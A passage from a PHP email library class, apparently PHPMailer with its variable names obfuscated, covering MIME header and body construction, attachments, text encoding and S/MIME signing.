1)) { $spca0243 -= 2; } $sp31905b = substr($spc99cbd, 0, $spca0243); $spc99cbd = (string) substr($spc99cbd, $spca0243); if ($spc99cbd !== '') { $spcc4379 .= $sp31905b . sprintf('=%s', static::$LE); } else { $sp8cce46 = $sp31905b; } } } else { $spe936cc = $sp8cce46; if (!$sp2b0c60) { $sp8cce46 .= ' '; } $sp8cce46 .= $spc99cbd; if ('' !== $spe936cc && strlen($sp8cce46) > $spcca846) { $spcc4379 .= $spe936cc . $spe0a42b; $sp8cce46 = $spc99cbd; } } $sp2b0c60 = false; } $spcc4379 .= $sp8cce46 . static::$LE; } return $spcc4379; } public function utf8CharBoundary($spb6c4a0, $spc9ce47) { $sp040cbc = false; $spcf6e70 = 3; while (!$sp040cbc) { $spa49a61 = substr($spb6c4a0, $spc9ce47 - $spcf6e70, $spcf6e70); $sp1b7019 = strpos($spa49a61, '='); if (false !== $sp1b7019) { $sp279085 = substr($spb6c4a0, $spc9ce47 - $spcf6e70 + $sp1b7019 + 1, 2); $spda2fbf = hexdec($sp279085); if ($spda2fbf < 128) { if ($sp1b7019 > 0) { $spc9ce47 -= $spcf6e70 - $sp1b7019; } $sp040cbc = true; } elseif ($spda2fbf >= 192) { $spc9ce47 -= $spcf6e70 - $sp1b7019; $sp040cbc = true; } elseif ($spda2fbf < 192) { $spcf6e70 += 3; } } else { $sp040cbc = true; } } return $spc9ce47; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case 'alt': case 'alt_inline': case 'alt_attach': case 'alt_inline_attach': $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $spd1b056 = ''; $spd1b056 .= $this->headerLine('Date', '' === $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ('mail' !== $this->Mailer) { foreach ($this->to as $sp51b31c) { $this->SingleToArray[] = $this->addrFormat($sp51b31c); } } } elseif (count($this->to) > 0) { if ('mail' !== $this->Mailer) { $spd1b056 .= $this->addrAppend('To', $this->to); } } elseif (count($this->cc) === 0) { $spd1b056 .= $this->headerLine('To', 'undisclosed-recipients:;'); } $spd1b056 .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $spd1b056 .= $this->addrAppend('Cc', $this->cc); } if (('sendmail' === $this->Mailer || 'qmail' === $this->Mailer || 'mail' === $this->Mailer) && count($this->bcc) > 0) { $spd1b056 .= $this->addrAppend('Bcc', $this->bcc); } if (count($this->ReplyTo) > 0) { $spd1b056 .= $this->addrAppend('Reply-To', $this->ReplyTo); } if ('mail' !== $this->Mailer) { $spd1b056 .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' !== $this->MessageID && preg_match('/^<.*@.*>$/', $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname()); } $spd1b056 .= $this->headerLine('Message-ID', $this->lastMessageID); if (null !== $this->Priority) { $spd1b056 .= $this->headerLine('X-Priority', $this->Priority); } if ('' !== $this->ConfirmReadingTo) { $spd1b056 .= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>'); } foreach ($this->CustomHeader as $sp3481c3) { $spd1b056 .= $this->headerLine(trim($sp3481c3[0]), $this->encodeHeader(trim($sp3481c3[1]))); } if (!$this->sign_key_file) { $spd1b056 .= $this->headerLine('MIME-Version', '1.0'); $spd1b056 .= $this->getMailMIME(); } return $spd1b056; } public function getMailMIME() { $spd1b056 = ''; $spa82e25 = true; switch ($this->message_type) { case 'inline': $spd1b056 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spd1b056 .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'attach': case 'inline_attach': case 'alt_attach': case 'alt_inline_attach': $spd1b056 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_MIXED . ';'); $spd1b056 .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'alt': case 'alt_inline': $spd1b056 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spd1b056 .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; default: $spd1b056 .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet); $spa82e25 = false; break; } if (static::ENCODING_7BIT !== $this->Encoding) { if ($spa82e25) { if (static::ENCODING_8BIT === $this->Encoding) { $spd1b056 .= $this->headerLine('Content-Transfer-Encoding', static::ENCODING_8BIT); } } else { $spd1b056 .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding); } } if ('mail' !== $this->Mailer) { } return $spd1b056; } public function getSentMIMEMessage() { return static::stripTrailingWSP($this->MIMEHeader . $this->mailHeader) . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $spca0243 = 32; $sp4e733a = ''; if (function_exists('random_bytes')) { try { $sp4e733a = random_bytes($spca0243); } catch (\Exception $spb1dfb4) { } } elseif (function_exists('openssl_random_pseudo_bytes')) { $sp4e733a = openssl_random_pseudo_bytes($spca0243); } if ($sp4e733a === '') { $sp4e733a = hash('sha256', uniqid((string) mt_rand(), true), true); } return str_replace(array('=', '+', '/'), '', base64_encode(hash('sha256', $sp4e733a, true))); } public function createBody() { $spb9ada7 = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = 'b1_' . $this->uniqueid; $this->boundary[2] = 'b2_' . $this->uniqueid; $this->boundary[3] = 'b3_' . $this->uniqueid; if ($this->sign_key_file) { $spb9ada7 .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $spab3bfe = $this->Encoding; $sp51eeda = $this->CharSet; if (static::ENCODING_8BIT === $spab3bfe && !$this->has8bitChars($this->Body)) { $spab3bfe = static::ENCODING_7BIT; $sp51eeda = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $this->Encoding && static::hasLineLongerThanMax($this->Body)) { $spab3bfe = static::ENCODING_QUOTED_PRINTABLE; } $spe211f3 = $this->Encoding; $spfa6e5c = $this->CharSet; if (static::ENCODING_8BIT === $spe211f3 && !$this->has8bitChars($this->AltBody)) { $spe211f3 = static::ENCODING_7BIT; $spfa6e5c = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $spe211f3 && static::hasLineLongerThanMax($this->AltBody)) { $spe211f3 = static::ENCODING_QUOTED_PRINTABLE; } $sp27e897 = 'This is a multi-part message in MIME format.' . static::$LE . static::$LE; switch ($this->message_type) { case 'inline': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->getBoundary($this->boundary[1], $sp51eeda, '', $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('inline', $this->boundary[1]); break; case 'attach': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->getBoundary($this->boundary[1], $sp51eeda, '', $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'inline_attach': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->textLine('--' . $this->boundary[1]); $spb9ada7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spb9ada7 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spb9ada7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[2], $sp51eeda, '', $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('inline', $this->boundary[2]); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->getBoundary($this->boundary[1], $spfa6e5c, static::CONTENT_TYPE_PLAINTEXT, $spe211f3); $spb9ada7 .= $this->encodeString($this->AltBody, $spe211f3); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[1], $sp51eeda, static::CONTENT_TYPE_TEXT_HTML, $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; if (!empty($this->Ical)) { $sp55b99a = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $spa095d9) { if (stripos($this->Ical, 'METHOD:' . $spa095d9) !== false) { $sp55b99a = $spa095d9; break; } } $spb9ada7 .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $sp55b99a, ''); $spb9ada7 .= $this->encodeString($this->Ical, $this->Encoding); $spb9ada7 .= static::$LE; } $spb9ada7 .= $this->endBoundary($this->boundary[1]); break; case 'alt_inline': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->getBoundary($this->boundary[1], $spfa6e5c, static::CONTENT_TYPE_PLAINTEXT, $spe211f3); $spb9ada7 .= $this->encodeString($this->AltBody, $spe211f3); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->textLine('--' . $this->boundary[1]); $spb9ada7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spb9ada7 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spb9ada7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[2], $sp51eeda, static::CONTENT_TYPE_TEXT_HTML, $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('inline', $this->boundary[2]); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->endBoundary($this->boundary[1]); break; case 'alt_attach': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->textLine('--' . $this->boundary[1]); $spb9ada7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spb9ada7 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[2], $spfa6e5c, static::CONTENT_TYPE_PLAINTEXT, $spe211f3); $spb9ada7 .= $this->encodeString($this->AltBody, $spe211f3); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[2], $sp51eeda, static::CONTENT_TYPE_TEXT_HTML, $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; if (!empty($this->Ical)) { $sp55b99a = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $spa095d9) { if (stripos($this->Ical, 'METHOD:' . $spa095d9) !== false) { $sp55b99a = $spa095d9; break; } } $spb9ada7 .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $sp55b99a, ''); $spb9ada7 .= $this->encodeString($this->Ical, $this->Encoding); } $spb9ada7 .= $this->endBoundary($this->boundary[2]); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt_inline_attach': $spb9ada7 .= $sp27e897; $spb9ada7 .= $this->textLine('--' . $this->boundary[1]); $spb9ada7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spb9ada7 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[2], $spfa6e5c, static::CONTENT_TYPE_PLAINTEXT, $spe211f3); $spb9ada7 .= $this->encodeString($this->AltBody, $spe211f3); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->textLine('--' . $this->boundary[2]); $spb9ada7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spb9ada7 .= $this->textLine(' boundary="' . $this->boundary[3] . '";'); $spb9ada7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->getBoundary($this->boundary[3], $sp51eeda, static::CONTENT_TYPE_TEXT_HTML, $spab3bfe); $spb9ada7 .= $this->encodeString($this->Body, $spab3bfe); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('inline', $this->boundary[3]); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->endBoundary($this->boundary[2]); $spb9ada7 .= static::$LE; $spb9ada7 .= $this->attachAll('attachment', $this->boundary[1]); break; default: $this->Encoding = $spab3bfe; $spb9ada7 .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $spb9ada7 = ''; if ($this->exceptions) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined('PKCS7_TEXT')) { throw new Exception($this->lang('extension_missing') . 'openssl'); } $sp1d05bb = tempnam(sys_get_temp_dir(), 'srcsign'); $sp5c53a3 = tempnam(sys_get_temp_dir(), 'mailsign'); file_put_contents($sp1d05bb, $spb9ada7); if (empty($this->sign_extracerts_file)) { $spa50935 = @openssl_pkcs7_sign($sp1d05bb, $sp5c53a3, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $spa50935 = @openssl_pkcs7_sign($sp1d05bb, $sp5c53a3, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } @unlink($sp1d05bb); if ($spa50935) { $spb9ada7 = file_get_contents($sp5c53a3); @unlink($sp5c53a3); $spa81ef9 = explode('

', $spb9ada7, 2); $this->MIMEHeader .= $spa81ef9[0] . static::$LE . static::$LE; $spb9ada7 = $spa81ef9[1]; } else { @unlink($sp5c53a3); throw new Exception($this->lang('signing') . openssl_error_string()); } } catch (Exception $sp9d3ae1) { $spb9ada7 = ''; if ($this->exceptions) { throw $sp9d3ae1; } } } return $spb9ada7; } protected function getBoundary($sp9b0d56, $sp6fc71f, $sp948ad0, $sp246add) { $spd1b056 = ''; if ('' === $sp6fc71f) { $sp6fc71f = $this->CharSet; } if ('' === $sp948ad0) { $sp948ad0 = $this->ContentType; } if ('' === $sp246add) { $sp246add = $this->Encoding; } $spd1b056 .= $this->textLine('--' . $sp9b0d56); $spd1b056 .= sprintf('Content-Type: %s; charset=%s', $sp948ad0, $sp6fc71f); $spd1b056 .= static::$LE; if (static::ENCODING_7BIT !== $sp246add) { $spd1b056 .= $this->headerLine('Content-Transfer-Encoding', $sp246add); } $spd1b056 .= static::$LE; return $spd1b056; } protected function endBoundary($sp9b0d56) { return static::$LE . '--' . $sp9b0d56 . '--' . static::$LE; } protected function setMessageType() { $spd0476d = array(); if ($this->alternativeExists()) { $spd0476d[] = 'alt'; } if ($this->inlineImageExists()) { $spd0476d[] = 'inline'; } if ($this->attachmentExists()) { $spd0476d[] = 'attach'; } $this->message_type = implode('_', $spd0476d); if ('' === $this->message_type) { $this->message_type = 'plain'; } } public function headerLine($spea80ec, $spd05110) { return $spea80ec . ': ' . $spd05110 . static::$LE; } public function textLine($spd05110) { return $spd05110 . static::$LE; } public function addAttachment($sp2cedb8, $spea80ec = '', $sp246add = self::ENCODING_BASE64, $spd0476d = '', $sp5d6a19 = 'attachment') { try { if (!static::isPermittedPath($sp2cedb8) || !@is_file($sp2cedb8) || !is_readable($sp2cedb8)) { throw new Exception($this->lang('file_access') . $sp2cedb8, self::STOP_CONTINUE); } if ('' === $spd0476d) { $spd0476d = static::filenameToType($sp2cedb8); } $sp963928 = (string) static::mb_pathinfo($sp2cedb8, PATHINFO_BASENAME); if ('' === $spea80ec) { $spea80ec = $sp963928; } if (!$this->validateEncoding($sp246add)) { throw new Exception($this->lang('encoding') . $sp246add); } $this->attachment[] = array(0 => $sp2cedb8, 1 => $sp963928, 2 => $spea80ec, 3 => $sp246add, 4 => $spd0476d, 5 => false, 6 => $sp5d6a19, 7 => $spea80ec); } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); $this->edebug($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($spb88ab1, $sp9b0d56) { $sp646196 = array(); $sp567ed9 = array(); $sp36d29a = array(); foreach ($this->attachment as $sp0b8fb4) { if ($sp0b8fb4[6] === $spb88ab1) { $spb544cc = ''; $sp2cedb8 = ''; $spfe1e1f = $sp0b8fb4[5]; if ($spfe1e1f) { $spb544cc = $sp0b8fb4[0]; } else { $sp2cedb8 = $sp0b8fb4[0]; } $sp28af8f = hash('sha256', serialize($sp0b8fb4)); if (in_array($sp28af8f, $sp36d29a, true)) { continue; } $sp36d29a[] = $sp28af8f; $spea80ec = $sp0b8fb4[2]; $sp246add = $sp0b8fb4[3]; $spd0476d = $sp0b8fb4[4]; $sp5d6a19 = $sp0b8fb4[6]; $spb12ced = $sp0b8fb4[7]; if ('inline' === $sp5d6a19 && array_key_exists($spb12ced, $sp567ed9)) { continue; } $sp567ed9[$spb12ced] = true; $sp646196[] = sprintf('--%s%s', $sp9b0d56, static::$LE); if (!empty($spea80ec)) { $sp646196[] = sprintf('Content-Type: %s; name=%s%s', $spd0476d, static::quotedString($this->encodeHeader($this->secureHeader($spea80ec))), static::$LE); } else { $sp646196[] = sprintf('Content-Type: %s%s', $spd0476d, static::$LE); } if (static::ENCODING_7BIT !== $sp246add) { $sp646196[] = sprintf('Content-Transfer-Encoding: %s%s', $sp246add, static::$LE); } if ((string) $spb12ced !== '' && $sp5d6a19 === 'inline') { $sp646196[] = 'Content-ID: <' . $this->encodeHeader($this->secureHeader($spb12ced)) . '>' . static::$LE; } if (!empty($sp5d6a19)) { $spba97fa = $this->encodeHeader($this->secureHeader($spea80ec)); if (!empty($spba97fa)) { $sp646196[] = sprintf('Content-Disposition: %s; filename=%s%s', $sp5d6a19, static::quotedString($spba97fa), static::$LE . static::$LE); } else { $sp646196[] = sprintf('Content-Disposition: %s%s', $sp5d6a19, static::$LE . static::$LE); } } else { $sp646196[] = static::$LE; } if ($spfe1e1f) { $sp646196[] = $this->encodeString($spb544cc, $sp246add); } else { $sp646196[] = $this->encodeFile($sp2cedb8, $sp246add); } if ($this->isError()) { return ''; } $sp646196[] = static::$LE; } } $sp646196[] = sprintf('--%s--%s', $sp9b0d56, static::$LE); return implode('', $sp646196); } protected function encodeFile($sp2cedb8, $sp246add = self::ENCODING_BASE64) { try { if (!static::isPermittedPath($sp2cedb8) || !file_exists($sp2cedb8) || !is_readable($sp2cedb8)) { throw new Exception($this->lang('file_open') . $sp2cedb8, self::STOP_CONTINUE); } $sp60d278 = file_get_contents($sp2cedb8); if (false === $sp60d278) { throw new Exception($this->lang('file_open') . $sp2cedb8, self::STOP_CONTINUE); } $sp60d278 = $this->encodeString($sp60d278, $sp246add); return $sp60d278; } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); $this->edebug($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return ''; } } public function encodeString($spd82e5e, $sp246add = self::ENCODING_BASE64) { $sp00e92c = ''; switch (strtolower($sp246add)) { case static::ENCODING_BASE64: $sp00e92c = chunk_split(base64_encode($spd82e5e), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $sp00e92c = static::normalizeBreaks($spd82e5e); if (substr($sp00e92c, -strlen(static::$LE)) !== static::$LE) { $sp00e92c .= static::$LE; } break; case static::ENCODING_BINARY: $sp00e92c = $spd82e5e; break; case static::ENCODING_QUOTED_PRINTABLE: $sp00e92c = $this->encodeQP($spd82e5e); break; default: $this->setError($this->lang('encoding') . $sp246add); if ($this->exceptions) { throw new Exception($this->lang('encoding') . $sp246add); } break; } return $sp00e92c; } public function encodeHeader($spd82e5e, $sp4c8a49 = 'text') { $spf1e57d = 0; switch (strtolower($sp4c8a49)) { case 'phrase': if (!preg_match('/[\\200-\\377]/', $spd82e5e)) { $sp00e92c = addcslashes($spd82e5e, '..\\"'); if ($spd82e5e === $sp00e92c && !preg_match('/[^A-Za-z0-9!#$%&\'*+\\/=?^_`{|}~ -]/', $spd82e5e)) { return $sp00e92c; } return "\"{$sp00e92c}\""; } $spf1e57d = preg_match_all('/[^\\040\\041\\043-\\133\\135-\\176]/', $spd82e5e, $sp979d0c); break; case 'comment': $spf1e57d = preg_match_all('/[()"]/', $spd82e5e, $sp979d0c); case 'text': default: $spf1e57d += preg_match_all('/[\\000-\\010\\013\\014\\016-\\037\\177-\\377]/', $spd82e5e, $sp979d0c); break; } if ($this->has8bitChars($spd82e5e)) { $spe9b28c = $this->CharSet; } else { $spe9b28c = static::CHARSET_ASCII; } $sp1e8b54 = 8 + strlen($spe9b28c); if ('mail' === $this->Mailer) { $spc012d3 = static::MAIL_MAX_LINE_LENGTH - $sp1e8b54; } else { $spc012d3 = static::MAX_LINE_LENGTH - $sp1e8b54; } if ($spf1e57d > strlen($spd82e5e) / 3) { $sp246add = 'B'; } elseif ($spf1e57d > 0) { $sp246add = 'Q'; } elseif (strlen($spd82e5e) > $spc012d3) { $sp246add = 'Q'; } else { $sp246add = false; } switch ($sp246add) { case 'B': if ($this->hasMultiBytes($spd82e5e)) { $sp00e92c = $this->base64EncodeWrapMB($spd82e5e, '
'); } else { $sp00e92c = base64_encode($spd82e5e); $spc012d3 -= $spc012d3 % 4; $sp00e92c = trim(chunk_split($sp00e92c, $spc012d3, '
')); } $sp00e92c = preg_replace('/^(.*)$/m', ' =?' . $spe9b28c . "?{$sp246add}?\\1?=", $sp00e92c); break; case 'Q': $sp00e92c = $this->encodeQ($spd82e5e, $sp4c8a49); $sp00e92c = $this->wrapText($sp00e92c, $spc012d3, true); $sp00e92c = str_replace('=' . static::$LE, '
', trim($sp00e92c)); $sp00e92c = preg_replace('/^(.*)$/m', ' =?' . $spe9b28c . "?{$sp246add}?\\1?=", $sp00e92c); break; default: return $spd82e5e; } return trim(static::normalizeBreaks($sp00e92c)); } public function hasMultiBytes($spd82e5e) { if (function_exists('mb_strlen')) { return strlen($spd82e5e) > mb_strlen($spd82e5e, $this->CharSet); } return false; } public function has8bitChars($spd161a8) { return (bool) preg_match('/[\\x80-\\xFF]/', $spd161a8); } public function base64EncodeWrapMB($spd82e5e, $spcf8188 = null) { $spf1df0c = '=?' . $this->CharSet . '?B?'; $sp8e13d5 = '?='; $sp00e92c = ''; if (null === $spcf8188) { $spcf8188 = static::$LE; } $sp866427 = mb_strlen($spd82e5e, $this->CharSet); $spcca846 = 75 - strlen($spf1df0c) - strlen($sp8e13d5); $sp89c920 = $sp866427 / strlen($spd82e5e); $sp25dbd0 = floor($spcca846 * $sp89c920 * 0.75); $sp521ba9 = 0; for ($spe144a6 = 0; $spe144a6 < $sp866427; $spe144a6 += $sp521ba9) { $spcf6e70 = 0; do { $sp521ba9 = $sp25dbd0 - $spcf6e70; $sp191a96 = mb_substr($spd82e5e, $spe144a6, $sp521ba9, $this->CharSet); $sp191a96 = base64_encode($sp191a96); ++$spcf6e70; } while (strlen($sp191a96) > $spcca846); $sp00e92c .= $sp191a96 . $spcf8188; } return substr($sp00e92c, 0, -strlen($spcf8188)); } public function encodeQP($spb544cc) { return static::normalizeBreaks(quoted_printable_encode($spb544cc)); } public function encodeQ($spd82e5e, $sp4c8a49 = 'text') { $spe87743 = ''; $sp00e92c = str_replace(array('
', '
'), '', $spd82e5e); switch (strtolower($sp4c8a49)) { case 'phrase': $spe87743 = '^A-Za-z0-9!*+\\/ -'; break; case 'comment': $spe87743 = '\\(\\)"'; case 'text': default: $spe87743 = '\\000-\\011\\013\\014\\016-\\037\\075\\077\\137\\177-\\377' . $spe87743; break; } $sp979d0c = array(); if (preg_match_all("/[{$spe87743}]/", $sp00e92c, $sp979d0c)) { $spb84f4c = array_search('=', $sp979d0c[0], true); if (false !== $spb84f4c) { unset($sp979d0c[0][$spb84f4c]); array_unshift($sp979d0c[0], '='); } foreach (array_unique($sp979d0c[0]) as $spae1028) { $sp00e92c = str_replace($spae1028, '=' . sprintf('%02X', ord($spae1028)), $sp00e92c); } } return str_replace(' ', '_', $sp00e92c); } public function addStringAttachment($spb544cc, $sp963928, $sp246add = self::ENCODING_BASE64, $spd0476d = '', $sp5d6a19 = 'attachment') { try { if ('' === $spd0476d) { $spd0476d = static::filenameToType($sp963928); } if (!$this->validateEncoding($sp246add)) { throw new Exception($this->lang('encoding') . $sp246add); } $this->attachment[] = array(0 => $spb544cc, 1 => $sp963928, 2 => static::mb_pathinfo($sp963928, PATHINFO_BASENAME), 3 => $sp246add, 4 => $spd0476d, 5 => true, 6 => $sp5d6a19, 7 => 0); } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); $this->edebug($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return false; } return true; } public function addEmbeddedImage($sp2cedb8, $spb12ced, $spea80ec = '', $sp246add = self::ENCODING_BASE64, $spd0476d = '', $sp5d6a19 = 'inline') { try { if (!static::isPermittedPath($sp2cedb8) || !@is_file($sp2cedb8) || !is_readable($sp2cedb8)) { throw new Exception($this->lang('file_access') . $sp2cedb8, self::STOP_CONTINUE); } if ('' === $spd0476d) { $spd0476d = static::filenameToType($sp2cedb8); } if (!$this->validateEncoding($sp246add)) { throw new Exception($this->lang('encoding') . $sp246add); } $sp963928 = (string) static::mb_pathinfo($sp2cedb8, PATHINFO_BASENAME); if ('' === $spea80ec) { $spea80ec = $sp963928; } $this->attachment[] = array(0 => $sp2cedb8, 1 => $sp963928, 2 => $spea80ec, 3 => $sp246add, 4 => $spd0476d, 5 => false, 6 => $sp5d6a19, 7 => $spb12ced); } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); $this->edebug($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return false; } return true; } public function addStringEmbeddedImage($spb544cc, $spb12ced, $spea80ec = '', $sp246add = self::ENCODING_BASE64, $spd0476d = '', $sp5d6a19 = 'inline') { try { if ('' === $spd0476d && !empty($spea80ec)) { $spd0476d = static::filenameToType($spea80ec); } if (!$this->validateEncoding($sp246add)) { throw new Exception($this->lang('encoding') . $sp246add); } $this->attachment[] = array(0 => $spb544cc, 1 => $spea80ec, 2 => $spea80ec, 3 => $sp246add, 4 => $spd0476d, 5 => true, 6 => $sp5d6a19, 7 => $spb12ced); } catch (Exception $sp9d3ae1) { $this->setError($sp9d3ae1->getMessage()); $this->edebug($sp9d3ae1->getMessage()); if ($this->exceptions) { throw $sp9d3ae1; } return false; } return true; } protected function validateEncoding($sp246add) { return in_array($sp246add, array(self::ENCODING_7BIT, self::ENCODING_QUOTED_PRINTABLE, self::ENCODING_BASE64, self::ENCODING_8BIT, self::ENCODING_BINARY), true); } protected function cidExists($spb12ced) { foreach ($this->attachment as $sp0b8fb4) { if ('inline' === $sp0b8fb4[6] && $spb12ced === $sp0b8fb4[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $sp0b8fb4) { if ('inline' === $sp0b8fb4[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $sp0b8fb4) { if ('attachment' === $sp0b8fb4[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($spdb5bbc) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, static function ($sp868ae0) use($spdb5bbc) { return $sp868ae0[0] !== $spdb5bbc; }); } public function clearAddresses() { foreach ($this->to as $sp9c9f9c) { unset($this->all_recipients[strtolower($sp9c9f9c[0])]); } $this->to = array(); $this->clearQueuedAddresses('to'); } public function clearCCs() { foreach ($this->cc as $sp70b7d8) { unset($this->all_recipients[strtolower($sp70b7d8[0])]); } $this->cc = array(); $this->clearQueuedAddresses('cc'); } public function clearBCCs() { foreach ($this->bcc as $spf45e8e) { unset($this->all_recipients[strtolower($spf45e8e[0])]); } $this->bcc = array(); $this->clearQueuedAddresses('bcc'); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($sp5f3197) { ++$this->error_count; if ('smtp' === $this->Mailer && null !== $this->smtp) { $sp1ac1b5 = $this->smtp->getError(); if (!empty($sp1ac1b5['error'])) { $sp5f3197 .= $this->lang('smtp_error') . $sp1ac1b5['error']; if (!empty($sp1ac1b5['detail'])) { $sp5f3197 .= ' Detail: ' . $sp1ac1b5['detail']; } if (!empty($sp1ac1b5['smtp_code'])) { $sp5f3197 .= ' SMTP code: ' . $sp1ac1b5['smtp_code']; } if (!empty($sp1ac1b5['smtp_code_ex'])) { $sp5f3197 .= ' Additional SMTP info: ' . $sp1ac1b5['smtp_code_ex']; } } } $this->ErrorInfo = $sp5f3197; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date('D, j M Y H:i:s O'); } protected function serverHostname() { $spd1b056 = ''; if (!empty($this->Hostname)) { $spd1b056 = $this->Hostname; } elseif (isset($_SERVER) && array_key_exists('SERVER_NAME', $_SERVER)) { $spd1b056 = $_SERVER['SERVER_NAME']; } elseif (function_exists('gethostname') && gethostname() !== false) { $spd1b056 = gethostname(); } elseif (php_uname('n') !== false) { $spd1b056 = php_uname('n'); } if 